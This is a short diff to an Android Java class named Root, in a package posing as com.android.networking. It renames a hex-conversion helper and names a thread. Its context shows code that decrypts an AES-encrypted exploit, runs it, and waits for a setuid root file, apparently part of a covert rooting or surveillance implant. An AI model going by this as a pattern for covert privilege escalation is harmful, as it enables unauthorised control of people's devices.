@@ -29,6 +29,7 @@ import android.widget.Toast;
 import com.android.networking.auto.Cfg;
 import com.android.networking.capabilities.PackageInfo;
 import com.android.networking.crypto.Keys;
+import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.Execute;
 import com.android.networking.util.Utils;
@@ -236,7 +237,7 @@ public class Root {
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (decodeEnc): stream=" + stream.available());
-			Check.log(TAG + " (decodeEnc): key=" + Utils.byteArrayToHex(key.getEncoded()));
+			Check.log(TAG + " (decodeEnc): key=" + ByteArray.byteArrayToHex(key.getEncoded()));
 		}
 
 		// 17.4=AES/CBC/PKCS5Padding
@@ -305,7 +306,11 @@ public class Root {
 			String exppath = path + "/" + exploit; //$NON-NLS-1$
 
 			ExploitRunnable r = new ExploitRunnable(exppath);
-			new Thread(r).start();
+			Thread t = new Thread(r);
+			if (Cfg.DEBUG) {
+				t.setName(r.getClass().getSimpleName());
+			}
+			t.start();
 
 			// Attendiamo al max 100 secondi il nostro file setuid root
 			final long now = System.currentTimeMillis();
